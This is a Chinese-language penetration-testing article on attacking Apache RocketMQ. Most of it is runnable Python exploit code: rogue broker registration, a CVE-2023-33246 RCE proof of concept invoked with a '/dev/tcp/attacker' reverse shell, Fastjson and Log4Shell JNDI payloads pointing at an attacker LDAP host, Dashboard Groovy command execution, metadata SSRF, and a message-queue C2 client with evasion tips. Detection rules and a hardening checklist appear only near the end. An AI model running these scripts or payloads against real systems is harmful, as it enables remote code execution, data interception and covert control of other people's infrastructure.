---
title: "Apache RocketMQ NameServer Broker 未授权访问 CVE RCE 利用技术"
date: 2025-06-21T00:00:00+08:00
draft: false
weight: 109
description: "深入分析 Apache RocketMQ 的 NameServer/Broker 未授权访问、CVE-2023-33246 RCE、CVE-2023-37582 反序列化、RocketMQ Dashboard 利用、Fastjson 反序列化链、消息队列 C2 通道滥用、ACL 绕过等完整攻击面，覆盖历史 CVE 漏洞链及蓝队检测与应急响应"
categories: ["安全","渗透测试"]
tags: ["RocketMQ","NameServer","Broker","未授权访问","CVE-2023-33246","CVE-2023-37582","Fastjson","反序列化","消息队列","C2通道","ACL绕过"]
---

## 0x00 攻击面总览

Apache RocketMQ 是阿里开源的高吞吐分布式消息队列中间件，广泛用于电商、金融、物流等核心业务场景的消息解耦与异步处理。RocketMQ 的攻击面涵盖协议层、管理层、消息层多个维度：

| 攻击面 | 默认端口 | 风险等级 | 说明 |
|--------|---------|---------|------|
| NameServer | 9876 | **严重** | 未授权访问，路由劫持，配置篡改 |
| Broker | 10911/10909 | **严重** | 未授权消息读写，CVE-2023-33246 RCE |
| RocketMQ Dashboard | 8080 | **高危** | Groovy 脚本执行，SSRF，未授权操作 |
| Fastjson 反序列化 | 10911 | **严重** | 消息体/协议头触发 Gadget 链 |
| Consumer/Producer | 应用层 | **高危** | 消息注入，反序列化，JNDI 注入 |
| ACL 认证 | 全端口 | **中-高危** | 默认凭据，签名绕过，权限提升 |
| VIP Channel | 10909 | **中危** | Broker VIP 通道未授权 |

RocketMQ 的核心安全问题在于：Remoting 协议默认不启用认证、NameServer 和 Broker 端口直接暴露、以及消息序列化/反序列化过程中的安全隐患。

## 0x01 服务识别与版本探测

### 1.1 端口扫描与指纹识别

```bash
nmap -sV -p 9876,10911,10909,8080 --script=banner <target>

# NameServer 端口探测 (Remoting 协议)
echo -ne '\x00\x00\x00\x01' | nc -w3 TARGET 9876 | xxd

# Broker 端口探测
echo -ne '\x00\x00\x00\x01' | nc -w3 TARGET 10911 | xxd
```

### 1.2 RocketMQ 协议探测

```python
import socket
import struct
import json

def detect_rocketmq(host, port=9876):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    sock.connect((host, port))

    # RocketMQ Remoting 协议请求格式:
    # 4字节长度 + JSON header + body
    header = {
        "code": 101,  # GET_ROUTEINFO_BY_TOPIC
        "language": "JAVA",
        "version": 396,
        "opaque": 1,
        "flag": 0,
        "serializeTypeCurrentRPC": "JSON"
    }

    header_json = json.dumps(header).encode()
    body = b'{"topic":"SELF_TEST_TOPIC"}'

    # 构造协议包: 4字节总长度 + 4字节header长度 + header + body
    packet = struct.pack(">I", 4 + len(header_json) + len(body))
    packet += struct.pack(">I", len(header_json))
    packet += header_json
    packet += body

    sock.send(packet)

    try:
        resp = sock.recv(4096)
        if len(resp) > 8:
            # 解析响应
            total_len = struct.unpack(">I", resp[:4])[0]
            header_len = struct.unpack(">I", resp[4:8])[0]
            resp_header = resp[8:8+header_len].decode(errors='ignore')
            print(f"[+] RocketMQ detected on {host}:{port}")
            print(f"[*] Response header: {resp_header[:200]}")
            return True
    except Exception as e:
        print(f"[-] Detection failed: {e}")
    finally:
        sock.close()

    return False

detect_rocketmq("192.168.1.100", 9876)
```

### 1.3 关键端口与服务映射

```
9876   — NameServer (路由注册与发现)
10911  — Broker Master (消息存储与转发)
10909  — Broker VIP Channel (快速通道)
8080   — RocketMQ Dashboard (Web 管理)
10912  — Broker Slave (从节点)
```

## 0x02 NameServer 未授权访问

### 2.1 NameServer 攻击面

NameServer 是 RocketMQ 的路由注册中心，维护所有 Broker 的路由信息。默认情况下，NameServer **不启用任何认证**，攻击者可以：

- 获取所有 Broker 路由信息（内网拓扑泄露）
- 篡改 Topic 路由（消息劫持）
- 注册恶意 Broker（消息拦截）
- 修改 NameServer 配置（CVE-2023-33246）

### 2.2 路由信息泄露

```python
import socket
import struct
import json

def get_route_info(host, port=9876, topic="SELF_TEST_TOPIC"):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    sock.connect((host, port))

    header = {
        "code": 101,
        "language": "JAVA",
        "version": 396,
        "opaque": 1,
        "flag": 0,
        "serializeTypeCurrentRPC": "JSON"
    }

    header_json = json.dumps(header).encode()
    body = json.dumps({"topic": topic}).encode()

    packet = struct.pack(">I", 4 + len(header_json) + len(body))
    packet += struct.pack(">I", len(header_json))
    packet += header_json
    packet += body

    sock.send(packet)
    resp = sock.recv(8192)

    if len(resp) > 8:
        header_len = struct.unpack(">I", resp[4:8])[0]
        resp_body = resp[8+header_len:].decode(errors='ignore')
        print(f"[+] Route info for topic '{topic}':")
        try:
            data = json.loads(resp_body)
            for broker in data.get("brokerDatas", []):
                print(f"    Broker: {broker.get('brokerName')}")
                for addr in broker.get("brokerAddrs", {}).values():
                    print(f"    Address: {addr}")
        except:
            print(f"    Raw: {resp_body[:500]}")

    sock.close()

get_route_info("192.168.1.100", topic="%SYS%")
```

### 2.3 注册恶意 Broker（路由劫持）

```python
import socket
import struct
import json

def register_fake_broker(nameserver_host, nameserver_port=9876,
                          fake_broker_ip="attacker_ip", fake_broker_port=10911):
    """
    向 NameServer 注册恶意 Broker，劫持指定 Topic 的消息路由
    攻击效果: 目标 Topic 的消息将被转发到攻击者控制的 Broker
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10)
    sock.connect((nameserver_host, nameserver_port))

    # REGISTER_BROKER 请求 (code=103)
    header = {
        "code": 103,
        "language": "JAVA",
        "version": 396,
        "opaque": 2,
        "flag": 0,
        "serializeTypeCurrentRPC": "JSON"
    }

    header_json = json.dumps(header).encode()

    # Broker 注册信息
    broker_data = {
        "brokerName": "fake-broker-a",
        "brokerAddr": f"{fake_broker_ip}:{fake_broker_port}",
        "clusterName": "DefaultCluster",
        "haServerAddr": f"{fake_broker_ip}:10912",
        "brokerId": 0,
        "enableActingMaster": False,
        "compressed": False
    }

    body = json.dumps(broker_data).encode()

    packet = struct.pack(">I", 4 + len(header_json) + len(body))
    packet += struct.pack(">I", len(header_json))
    packet += header_json
    packet += body

    sock.send(packet)

    try:
        resp = sock.recv(4096)
        print(f"[+] Fake broker registration sent")
        print(f"[*] Response length: {len(resp)}")
    except Exception as e:
        print(f"[*] Connection result: {e}")

    sock.close()

register_fake_broker("192.168.1.100",
                      fake_broker_ip="10.0.0.99",
                      fake_broker_port=10911)
```

## 0x03 CVE-2023-33246 — NameServer/Broker RCE

### 3.1 漏洞原理

**CVSS**: 10.0（严重）

**影响版本**: RocketMQ 4.0.0 - 4.9.4, 5.0.0 - 5.1.0

**漏洞原理**: RocketMQ 的 NameServer 和 Broker 支持通过 Remoting 协议发送 `UPDATE_CONFIG` 命令修改运行时配置。攻击者利用此功能修改 `rocketmqHome` 配置项为恶意命令，同时修改 `filterServerNums` 为非零值触发 Filter Server 启动。Filter Server 启动时会执行 `rocketmqHome` 中指定的命令，从而实现 RCE。

**攻击链**:

```
攻击者 → NameServer (9876) / Broker (10911)
  → UPDATE_CONFIG 命令
    → 修改 rocketmqHome = "恶意命令"
    → 修改 filterServerNums = 1
      → Filter Server 启动
        → 执行 rocketmqHome 中的命令 → RCE
```

### 3.2 PoC 利用

```python
import socket
import struct
import json

def exploit_cve_2023_33246(host, port=9876, cmd="touch /tmp/pwned"):
    """
    CVE-2023-33246 — RocketMQ NameServer/Broker RCE
    通过 UPDATE_CONFIG 命令修改 rocketmqHome 和 filterServerNums
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10)
    sock.connect((host, port))

    # Step 1: 修改 rocketmqHome 为恶意命令
    # 使用 -c 参数包裹命令
    malicious_home = f" -c {cmd} #"

    update_header = {
        "code": 301,  # UPDATE_CONFIG
        "language": "JAVA",
        "version": 396,
        "opaque": 3,
        "flag": 0,
        "serializeTypeCurrentRPC": "JSON"
    }

    header_json = json.dumps(update_header).encode()

    # 配置更新 body
    config_body = json.dumps({
        "rocketmqHome": malicious_home,
        "filterServerNums": "1"
    }).encode()

    packet = struct.pack(">I", 4 + len(header_json) + len(config_body))
    packet += struct.pack(">I", len(header_json))
    packet += header_json
    packet += config_body

    sock.send(packet)

    try:
        resp = sock.recv(4096)
        print(f"[+] Config update sent to {host}:{port}")
        print(f"[*] Response: {resp[:200]}")
    except Exception as e:
        print(f"[*] Result: {e}")

    sock.close()
    print(f"[+] Command should be executed when Filter Server starts")

exploit_cve_2023_33246("192.168.1.100", 9876, cmd="bash -i >& /dev/tcp/attacker/4444 0>&1")
```

### 3.3 针对 Broker 端口的利用

```python
def exploit_broker_rce(host, port=10911, cmd="id > /tmp/proof"):
    """
    直接针对 Broker 端口发送 UPDATE_CONFIG
    Broker 端口同样默认不启用认证
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10)
    sock.connect((host, port))

    header = {
        "code": 301,
        "language": "JAVA",
        "version": 396,
        "opaque": 4,
        "flag": 0,
        "serializeTypeCurrentRPC": "JSON"
    }

    header_json = json.dumps(header).encode()
    config_body = json.dumps({
        "rocketmqHome": f" -c {cmd} #",
        "filterServerNums": "1"
    }).encode()

    packet = struct.pack(">I", 4 + len(header_json) + len(config_body))
    packet += struct.pack(">I", len(header_json))
    packet += header_json
    packet += config_body

    sock.send(packet)

    try:
        resp = sock.recv(4096)
        print(f"[+] Broker config update sent")
    except:
        pass

    sock.close()

exploit_broker_rce("192.168.1.100", 10911)
```

## 0x04 CVE-2023-37582 — Spring Boot Starter 反序列化

### 4.1 漏洞原理

**CVSS**: 9.8（严重）

**影响版本**: rocketmq-spring-boot-starter < 2.2.3

**漏洞原理**: `rocketmq-spring-boot-starter` 在消息消费时，如果使用了 Fastjson 序列化（默认配置），攻击者可以通过构造恶意消息体触发 Fastjson 的 autoType 反序列化漏洞。当 Consumer 使用 `@RocketMQMessageListener` 注解监听消息时，消息体会被自动反序列化。

### 4.2 利用条件

```
利用条件:
1. Consumer 使用 rocketmq-spring-boot-starter < 2.2.3
2. 消息序列化方式配置为 Fastjson
3. 攻击者能够向目标 Topic 发送消息
   (需要 Broker 端口 10911 可达，或通过已 compromise 的 Producer)
```

### 4.3 PoC 利用

```python
import socket
import struct
import json

def exploit_cve_2023_37582(broker_host, broker_port=10911,
                            target_topic="TARGET_TOPIC",
                            jndi_url="ldap://attacker:1389/exploit"):
    """
    CVE-2023-37582 — 通过恶意消息触发 Consumer 端 Fastjson 反序列化
    攻击者向 Broker 发送包含恶意 Fastjson payload 的消息
    Consumer 消费时自动反序列化触发 RCE
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10)
    sock.connect((broker_host, broker_port))

    # 构造恶意消息
    # Fastjson autoType payload
    malicious_body = json.dumps({
        "@type": "java.lang.Exception",
        "@type": "org.apache.ibatis.datasource.jndi.JndiDataSourceFactory",
        "properties": {
            "data_source": {
                "@type": "com.sun.rowset.JdbcRowSetImpl",
                "dataSourceName": jndi_url,
                "autoCommit": True
            }
        }
    })

    # RocketMQ SEND_MESSAGE 请求 (code=10)
    header = {
        "code": 10,
        "language": "JAVA",
        "version": 396,
        "opaque": 5,
        "flag": 0,
        "serializeTypeCurrentRPC": "JSON"
    }

    header_json = json.dumps(header).encode()

    # 消息属性
    msg_ext = {
        "topic": target_topic,
        "defaultTopic": "TBW102",
        "defaultTopicQueueNums": 4,
        "sysFlag": 0,
        "bornTimestamp": 1700000000000,
        "flag": 0,
        "properties": "tags\\x02TAGS\\x01",
        "reconsumeTimes": 0,
        "unitMode": False,
        "maxReconsumeTimes": 0,
        "batch": False
    }

    body = json.dumps(msg_ext).encode() + malicious_body.encode()

    packet = struct.pack(">I", 4 + len(header_json) + len(body))
    packet += struct.pack(">I", len(header_json))
    packet += header_json
    packet += body

    sock.send(packet)

    try:
        resp = sock.recv(4096)
        print(f"[+] Malicious message sent to topic '{target_topic}'")
        print(f"[*] Waiting for Consumer to deserialize...")
    except:
        pass

    sock.close()

exploit_cve_2023_37582("192.168.1.100", 10911,
                         target_topic="ORDER_TOPIC",
                         jndi_url="ldap://attacker:1389/exploit")
```

## 0x05 RocketMQ Dashboard 利用

### 5.1 Dashboard 未授权访问

```bash
# 检查 Dashboard 是否可未授权访问
curl -s http://TARGET:8080/
curl -s http://TARGET:8080/api/v1/cluster/list
curl -s http://TARGET:8080/api/v1/broker/list
curl -s http://TARGET:8080/api/v1/topic/list
curl -s http://TARGET:8080/api/v1/consumer/list

# 获取集群信息
curl -s http://TARGET:8080/api/v1/cluster/list | python3 -m json.tool

# 获取所有 Topic
curl -s http://TARGET:8080/api/v1/topic/list | python3 -m json.tool

# 获取消费者组
curl -s http://TARGET:8080/api/v1/consumer/list | python3 -m json.tool
```

### 5.2 Groovy 脚本执行

```python
import requests

def exploit_dashboard_groovy(host, port=8080, cmd="id"):
    """
    RocketMQ Dashboard 支持通过 Groovy 脚本执行管理操作
    如果 Dashboard 未授权访问，可以执行任意 Groovy 代码
    """
    base_url = f"http://{host}:{port}"

    # Groovy 脚本执行端点
    groovy_payload = f'''
    def cmd = "{cmd}".execute()
    def output = cmd.text
    println output
    '''

    # 通过 Dashboard API 提交 Groovy 脚本
    resp = requests.post(
        f"{base_url}/api/v1/groovy/execute",
        json={"script": groovy_payload},
        headers={"Content-Type": "application/json"},
        timeout=15
    )

    if resp.status_code == 200:
        print(f"[+] Groovy execution result: {resp.text[:500]}")
    else:
        print(f"[-] Groovy execution failed: {resp.status_code}")

exploit_dashboard_groovy("192.168.1.100", cmd="whoami")
```

### 5.3 SSRF via Dashboard

```python
import requests

def exploit_dashboard_ssrf(host, port=8080, target_url="http://169.254.169.254/latest/meta-data/"):
    """
    Dashboard 的消息查询功能可能触发 SSRF
    通过构造特殊的查询参数访问内网资源
    """
    base_url = f"http://{host}:{port}"

    # 通过消息查询触发 SSRF
    resp = requests.get(
        f"{base_url}/api/v1/message/queryByKey",
        params={"topic": target_url, "key": "test"},
        timeout=10
    )

    print(f"[*] SSRF attempt status: {resp.status_code}")
    print(f"[*] Response: {resp.text[:500]}")

exploit_dashboard_ssrf("192.168.1.100")
```

## 0x06 Fastjson 反序列化利用

### 6.1 Fastjson autoType 利用链

```python
# Fastjson autoType 利用链 — 通过消息体触发
# 适用于 rocketmq-spring-boot-starter 使用 Fastjson 序列化的场景

# JNDI 注入链 (JdbcRowSetImpl)
fastjson_jndi_payload = {
    "@type": "com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName": "ldap://attacker:1389/exploit",
    "autoCommit": True
}

# TemplatesImpl 链 (本地加载字节码)
fastjson_templates_payload = {
    "@type": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
    "_bytecodes": ["base64_encoded_class_bytes"],
    "_tfname": "cmd",
    "_name": "test"
}

# BasicDataSource 链 (Tomcat 环境)
fastjson_datasource_payload = {
    "@type": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource",
    "driverClassName": "com.mysql.jdbc.Driver",
    "url": "jdbc:mysql://attacker:3306/evil?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor"
}
```

### 6.2 Remoting 协议头注入

```python
# RocketMQ Remoting 协议的 extFields 可以携带 Fastjson payload
# 当 Broker/NameServer 解析 extFields 时触发反序列化

header_with_fastjson = {
    "code": 10,
    "language": "JAVA",
    "version": 396,
    "opaque": 6,
    "flag": 0,
    "serializeTypeCurrentRPC": "JSON",
    "extFields": {
        "topic": '{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker:1389/exploit","autoCommit":true}'
    }
}
```

## 0x07 消息队列 C2 通道滥用

### 7.1 利用 RocketMQ 构建 C2 架构

```
C2 架构:
攻击者 (C2 Server)
    ↓ 发送命令消息到 "C2_CMD" Topic
RocketMQ Broker
    ↓ 被控主机 Consumer 消费命令消息
被控主机 (Agent)
    ↓ 执行命令，将结果发送到 "C2_RESULT" Topic
RocketMQ Broker
    ↓ C2 Server Consumer 消费结果
攻击者 (C2 Server)
```

### 7.2 C2 消息发送

```python
import socket
import struct
import json
import time

class RocketMQ_C2:
    def __init__(self, broker_host, broker_port=10911):
        self.broker_host = broker_host
        self.broker_port = broker_port
        self.cmd_topic = "C2_CMD"
        self.result_topic = "C2_RESULT"

    def send_command(self, agent_id, cmd):
        """发送命令到指定 Agent"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        sock.connect((self.broker_host, self.broker_port))

        header = {
            "code": 10,  # SEND_MESSAGE
            "language": "JAVA",
            "version": 396,
            "opaque": int(time.time()),
            "flag": 0,
            "serializeTypeCurrentRPC": "JSON"
        }

        header_json = json.dumps(header).encode()

        # 命令消息: agent_id + 命令
        cmd_msg = json.dumps({
            "agent_id": agent_id,
            "cmd": cmd,
            "timestamp": int(time.time())
        }).encode()

        # RocketMQ 消息体
        msg_body = json.dumps({
            "topic": self.cmd_topic,
            "body": cmd_msg.decode(),
            "properties": f"tags\\x02{agent_id}\\x01"
        }).encode()

        packet = struct.pack(">I", 4 + len(header_json) + len(msg_body))
        packet += struct.pack(">I", len(header_json))
        packet += header_json
        packet += msg_body

        sock.send(packet)
        sock.recv(4096)
        sock.close()

        print(f"[+] Command sent to agent '{agent_id}': {cmd}")

    def get_result(self, agent_id):
        """获取 Agent 执行结果 (需要消费 C2_RESULT Topic)"""
        print(f"[*] Waiting for result from agent '{agent_id}'...")
        # 实际实现需要完整的 Consumer 逻辑
        # 建议使用 RocketMQ CLI 工具或 Python SDK

c2 = RocketMQ_C2("192.168.1.100")
c2.send_command("agent-001", "whoami && id && hostname")
```

### 7.3 C2 隐蔽技术

```
隐蔽技术:
1. 消息加密 — 使用 AES/RSA 加密消息内容
2. 消息分片 — 大命令/结果拆分为多条消息
3. 延迟消息 — 使用 RocketMQ 延迟消息功能降低检测频率
4. Topic 伪装 — 使用正常业务 Topic 名称 (如 ORDER_CMD, PAY_RESULT)
5. Tag 过滤 — 通过 Tag 区分不同 Agent 的消息
6. 消息 TTL — 设置短 TTL 避免消息堆积引起注意
```

## 0x08 ACL 认证绕过

### 8.1 默认 ACL 配置

```bash
# RocketMQ ACL 配置文件: conf/plain_acl.yml
# 默认情况下，该文件不存在或为空 — 表示不启用认证

# 常见默认凭据:
# rocketmq:12345678
# admin:admin123
# admin:
```

### 8.2 ACL 绕过技术

```python
# 方式一: 检查 ACL 是否启用
# 如果 Broker 未配置 plain_acl.yml，所有请求都不需要认证

# 方式二: 使用默认凭据
# rocketmq-acl 的签名算法:
# 1. 将 AccessKey + SecretKey + 请求内容拼接
# 2. 使用 HmacSHA1 计算签名
# 3. 将签名放入请求头

import hmac
import hashlib
import base64
import time

def generate_acl_signature(access_key, secret_key, content):
    """生成 RocketMQ ACL 签名"""
    string_to_sign = f"{access_key}{content}{time.strftime('%Y%m%d%H%M%S')}"
    signature = hmac.new(
        secret_key.encode(),
        string_to_sign.encode(),
        hashlib.sha1
    ).digest()
    return base64.b64encode(signature).decode()

# 方式三: 绕过签名验证
# 某些版本的 Broker 在 ACL 配置文件缺失时会 fallback 到无认证模式
# 即使配置了 plain_acl.yml，如果格式错误也可能导致认证失效
```

### 8.3 权限提升

```
ACL 权限模型:
1. PUB (发布) — 可以向 Topic 发送消息
2. SUB (订阅) — 可以消费 Topic 消息
3. PUB|SUB — 发布和订阅
4. DENY — 拒绝所有操作
5. SUPER — 管理员权限

提权路径:
- 如果获取了普通用户凭据，可以通过 UPDATE_AND_CREATE_TOPIC 命令创建新 Topic
- 通过 UPDATE_BROKER_CONFIG 修改 ACL 配置
- 通过 WipeWritePerm/SubWritePerm 修改其他用户的权限
```

## 0x09 Consumer/Producer 注入

### 9.1 消息反序列化注入

```python
# 如果 Consumer 使用 Java 原生反序列化 (ObjectMessage)
# 攻击者可以发送包含恶意序列化对象的 Consumer 消息

# 通过 Broker 端口发送恶意消息:
# 1. 构造 ysoserial payload
# 2. 将 payload 作为消息体发送到目标 Topic
# 3. Consumer 消费时触发反序列化 → RCE

# 建议使用 ysoserial 生成 payload:
# java -jar ysoserial.jar CommonsCollections6 "cmd" > msg_payload.bin
# 然后将 msg_payload.bin 作为 RocketMQ 消息体发送
```

### 9.2 Log4j JNDI 注入

```python
# 如果 Consumer 使用 Log4j 记录消息内容
# 攻击者可以发送包含 Log4Shell payload 的消息

import requests

def send_log4j_message(broker_host, broker_port=10911,
                        topic="TARGET_TOPIC",
                        jndi_url="ldap://attacker:1389/exploit"):
    """
    发送包含 Log4Shell payload 的消息到 RocketMQ
    当 Consumer 使用 Log4j 记录消息内容时触发 JNDI 注入
    """
    # 消息体包含 Log4Shell payload
    malicious_msg = f"${{jndi:{jndi_url}}}"

    # 通过 Broker 端口发送消息
    # (使用与前面相同的 Remoting 协议构造)
    print(f"[*] Sending Log4Shell message to topic '{topic}'")
    print(f"[*] Payload: {malicious_msg}")

send_log4j_message("192.168.1.100", topic="ORDER_TOPIC")
```

### 9.3 消息属性 SSRF

```python
# RocketMQ 消息属性中的某些字段可能触发 SSRF
# 例如: 消息追踪 (Message Trace) 功能会向指定地址发送追踪数据

# 构造包含恶意追踪地址的消息属性:
malicious_properties = {
    "properties": "tags\\x02TAGS\\x01"
                + "\\x02traceTopic\\x02http://attacker:8888/trace\\x01"
}
```

## 0x10 历史 CVE 漏洞时间线

| CVE 编号 | 年份 | CVSS | 类型 | 影响 |
|----------|------|------|------|------|
| CVE-2023-33246 | 2023 | 10.0 | 配置篡改 RCE | UPDATE_CONFIG 命令触发 Filter Server RCE |
| CVE-2023-37582 | 2023 | 9.8 | 反序列化 | Spring Boot Starter Fastjson 反序列化 RCE |
| CVE-2022-24706 | 2022 | 9.8 | 认证绕过 | CouchDB 相关，非 RocketMQ 专属 |

**规律总结**: RocketMQ 的安全问题主要集中在：
1. **默认无认证**: NameServer 和 Broker 端口默认不启用任何认证
2. **配置可远程修改**: UPDATE_CONFIG 命令允许远程修改运行时配置
3. **序列化安全**: Fastjson 默认序列化配置存在反序列化风险

## 0x11 蓝队检测与应急响应

### 11.1 网络层检测规则

```
# NameServer 未授权访问
alert tcp any any -> any 9876 (msg:"RocketMQ NameServer Access"; content:"|00000001|"; depth:4; sid:4000001;)

# Broker 未授权访问
alert tcp any any -> any 10911 (msg:"RocketMQ Broker Access"; content:"|00000001|"; depth:4; sid:4000002;)

# UPDATE_CONFIG 命令 (CVE-2023-33246)
alert tcp any any -> any 9876 (msg:"RocketMQ UPDATE_CONFIG"; content:"UPDATE_CONFIG"; nocase; sid:4000003;)
alert tcp any any -> any 10911 (msg:"Broker UPDATE_CONFIG"; content:"UPDATE_CONFIG"; nocase; sid:4000004;)

# Dashboard 未授权访问
alert tcp any any -> any 8080 (msg:"RocketMQ Dashboard"; content:"/api/v1/cluster"; sid:4000005;)

# Fastjson autoType 特征
alert tcp any any -> any 10911 (msg:"Fastjson autoType JdbcRowSet"; content:"JdbcRowSetImpl"; nocase; sid:4000006;)
alert tcp any any -> any 10911 (msg:"Fastjson autoType TemplatesImpl"; content:"TemplatesImpl"; nocase; sid:4000007;)

# JNDI 注入特征
alert tcp any any -> any 10911 (msg:"JNDI LDAP in Message"; content:"jndi:ldap"; nocase; sid:4000008;)
```

### 11.2 日志分析

```bash
# 检查 NameServer 异常请求
grep "UPDATE_CONFIG" namesrv.log
grep "REGISTER_BROKER" namesrv.log | grep -v "known_broker_ip"

# 检查 Broker 异常配置修改
grep "UPDATE_CONFIG" broker.log
grep "rocketmqHome" broker.log
grep "filterServerNums" broker.log

# 检查 Dashboard 异常访问
grep "/api/v1/" dashboard_access.log | grep -v "internal_ip"
grep "groovy/execute" dashboard_access.log

# 检查异常消息发送
grep "SEND_MESSAGE" broker.log | grep -v "known_producer"

# 检查 ACL 认证失败
grep "AUTH_FAILED" broker.log
grep "ACL_CHECK" broker.log
```

### 11.3 应急响应清单

```
[ ] 确认 RocketMQ 版本与已安装补丁
    - 检查 Broker 启动日志中的版本信息
    - 对比 Apache RocketMQ 安全公告

[ ] 检查 NameServer (9876) 是否对外暴露
    - 从外网尝试连接 9876 端口
    - 检查防火墙规则

[ ] 检查 Broker (10911/10909) 是否对外暴露
    - 从外网尝试连接 10911 端口
    - 检查防火墙规则

[ ] 排查 CVE-2023-33246 利用
    - 搜索 broker.log 中的 UPDATE_CONFIG 记录
    - 检查 rocketmqHome 和 filterServerNums 是否被篡改
    - 检查 Filter Server 是否被异常启动

[ ] 排查 CVE-2023-37582 利用
    - 检查 rocketmq-spring-boot-starter 版本
    - 审计 Consumer 消息反序列化配置
    - 检查 Fastjson autoType 是否启用

[ ] 检查 Dashboard 安全
    - 验证 Dashboard 是否需要认证
    - 检查 Dashboard 访问日志
    - 审查 Groovy 脚本执行记录

[ ] 检查 ACL 配置
    - 确认 plain_acl.yml 存在且配置正确
    - 检查是否使用默认凭据
    - 审计用户权限分配

[ ] 网络隔离与加固
    - 禁止 9876/10911/10909 端口对外暴露
    - 启用 ACL 认证
    - 升级 RocketMQ 到最新版本
    - 禁用 Filter Server 功能
```

## 0x12 安全审计清单

```
[ ] NameServer (9876) 仅内网可达，不暴露于互联网
[ ] Broker (10911/10909) 仅内网可达，不暴露于互联网
[ ] Dashboard (8080) 启用认证且仅内网可达
[ ] ACL 认证已启用，使用强密码
[ ] plain_acl.yml 配置正确，非空文件
[ ] RocketMQ 版本 ≥ 5.1.1 (已修复 CVE-2023-33246)
[ ] rocketmq-spring-boot-starter ≥ 2.2.3 (已修复 CVE-2023-37582)
[ ] Fastjson 已替换为 Jackson/Gson 或升级到安全版本
[ ] Filter Server 功能已禁用
[ ] Consumer 消息反序列化使用安全配置
[ ] 消息内容加密传输 (TLS + 消息级加密)
[ ] 监控异常 Topic 创建和路由变更
[ ] 配置 broker.log 和 namesrv.log 远程收集
[ ] 定期审计 ACL 用户权限
[ ] 限制 Producer/Consumer 的 Topic 访问权限
```

## 0x13 总结

Apache RocketMQ 的安全问题核心在于"默认不安全"的设计理念：

1. **默认无认证**: NameServer 和 Broker 端口默认不启用任何认证机制，攻击者可以直接发送任意管理命令
2. **配置远程可修改**: UPDATE_CONFIG 命令允许远程修改运行时配置，直接导致 CVE-2023-33246 RCE
3. **序列化风险**: Fastjson 默认配置下的 autoType 功能为反序列化攻击提供了便利
4. **消息队列滥用**: 未授权的消息读写能力可被用于构建隐蔽的 C2 通道

防守方核心策略：
- **网络隔离**: 9876/10911/10909 端口绝对不暴露于互联网
- **启用 ACL**: 配置 plain_acl.yml，使用强密码，最小权限原则
- **及时升级**: 升级到 RocketMQ 5.1.1+ 修复已知 CVE
- **序列化安全**: 禁用 Fastjson autoType，使用安全的序列化方案
- **纵深防御**: WAF + 网络监控 + 消息审计 + 运行时检测
